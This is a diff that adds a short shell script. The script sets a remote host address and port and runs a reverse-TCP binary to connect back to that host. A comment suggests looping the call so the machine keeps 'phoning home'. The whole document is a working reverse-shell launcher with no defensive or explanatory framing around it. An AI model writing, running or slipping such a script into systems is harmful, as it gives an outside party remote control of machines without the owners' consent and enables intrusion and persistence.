@@ -1,0 +1,12 @@
+#!/bin/sh
+
+#WAN or LAN host is fine here.
+host=10.12.34.56
+port=8081 
+
+# We could put this in a loop if we wanted to phone home even
+# after the initial connection, or if network connectivity isn't
+# always available.
+
+/usr/sbin/reverse-tcp $host $port
+
